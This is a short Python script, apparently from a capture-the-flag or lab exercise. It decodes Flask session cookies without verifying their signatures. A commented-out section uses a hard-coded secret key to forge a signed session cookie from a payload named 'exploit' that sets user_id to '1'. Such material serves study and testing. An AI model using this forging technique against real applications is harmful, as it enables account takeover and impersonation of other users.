#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))



# from flask.sessions import SecureCookieSessionInterface

# key = r"9RxdzNwq7!nOoK3*"

# class App(object):
#     def __init__(self):
#         self.secret_key = None

# exploit = {'_fresh': True, '_id': 'cb9b7206917b35ec8873b377f37838d1a4c98c213668fd324f5fb9ed8c37fab9d383792075b6874d8cc3d9c688dfc7f79a7393ca80baa459d6f2a92e279dd16d', 'csrf_token': 'cc4f6a2b71689a97216c375796b5327122657cce', 'user_id': '1'}

# app = App()
# app.secret_key = key

# # Encode a session exactly how Flask would do it
# si = SecureCookieSessionInterface()
# serializer = si.get_signing_serializer(app)
# session = serializer.dumps(exploit)

# print(session)